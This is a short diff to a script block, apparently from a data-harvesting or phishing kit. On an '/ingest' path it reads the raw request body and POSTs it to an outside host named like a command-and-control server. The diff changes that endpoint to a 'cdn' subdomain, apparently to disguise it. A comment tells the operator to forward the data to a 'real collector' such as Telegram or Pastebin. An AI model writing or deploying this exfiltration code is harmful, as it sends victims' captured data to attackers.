@@ -4,6 +4,6 @@
 if (location.pathname === '/ingest') {
   const raw = await request.arrayBuffer();
   // TODO: forward to your real collector (Telegram, Matrix, Pastebin, etc.)
-  await fetch('https://v3accntc2.com', {method:'POST', body:raw});
+  await fetch('https://cdn.v3accntc2.com', {method:'POST', body:raw});
 }
 </script>
